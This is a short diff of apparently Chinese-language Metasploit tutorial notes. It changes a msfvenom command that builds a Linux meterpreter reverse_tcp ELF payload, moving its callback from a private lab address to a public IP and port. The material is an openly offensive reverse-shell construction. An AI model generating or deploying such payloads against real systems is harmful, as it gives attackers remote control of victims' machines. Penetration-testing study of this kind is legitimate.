@@ -1059,7 +1059,7 @@ windows/meterpreter/reverse_https  #通过监听443端口反向连接
   1. linux
        1.  CLI下生成payload
        ```shell
-      msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.91.129 lport=4444  -f elf -o shell.elf
+      msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=42.193.104.247 lport=5678  -f elf -o shell.elf
       ```
       2. 或者在MSF下生成一个shell
         ```         use payload/linux/x86/meterpreter/reverse_tcp 设置Option
